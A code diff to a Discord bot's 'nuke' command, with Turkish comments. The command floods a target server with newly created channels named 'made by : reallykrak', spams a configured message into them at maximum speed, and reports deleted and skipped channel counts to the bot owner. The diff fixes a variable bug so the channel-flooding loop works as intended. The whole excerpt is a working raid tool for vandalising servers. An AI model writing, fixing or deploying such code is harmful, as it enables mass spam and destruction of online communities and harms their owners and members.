@@ -32,8 +32,10 @@ module.exports = {
       }
 
       console.log(`Kanal oluşturma işlemini başlatıyorum`);
+      // DOĞRU DEĞİŞKEN BURADA TANIMLI
       const kanalAdi = "made by : reallykrak";
       let olusturulanKanalSayisi = 0;
+
       const maksimumHizSpam = async (kanal) => {
         const spamLoop = () => {
           kanal.send(config.nukeMessage).catch(() => {});
@@ -41,13 +43,16 @@ module.exports = {
         };
         spamLoop();
       };
+
       const maksimumHizKanalOlustur = () => {
         const kanalLoop = () => {
-          const kanalAdi =
-            harfler[Math.floor(Math.random() * harfler.length)];
+          // === DÜZELTME ===
+          // Aşağıdaki hatalı satırı sildik.
+          // const kanalAdi = harfler[Math.floor(Math.random() * harfler.length)];
 
           hedefSunucu.channels
             .create({
+              // Artık burası yukarıda tanımlanan doğru "kanalAdi" değişkenini kullanacak.
               name: kanalAdi,
               type: 0,
             })
@@ -69,7 +74,6 @@ module.exports = {
 
       const cevap = ` Nuke tamamlandı!\n Silinen: ${silinenSayisi}\n⚠️ Atlanan: ${atlanSayisi}\n🔥 reallykrak`;
 
-      // Kanalları silmeyi tamamladığı için config.json daki sahip id' deki kişiye dm den Mesaj atıcak
       const sahip = await client.users.fetch(config.ownerId);
       sahip.send(`${cevap}\nSunucu: ${hedefSunucu.name}`);
     } catch (error) {
@@ -78,3 +82,4 @@ module.exports = {
     }
   },
 };
+    
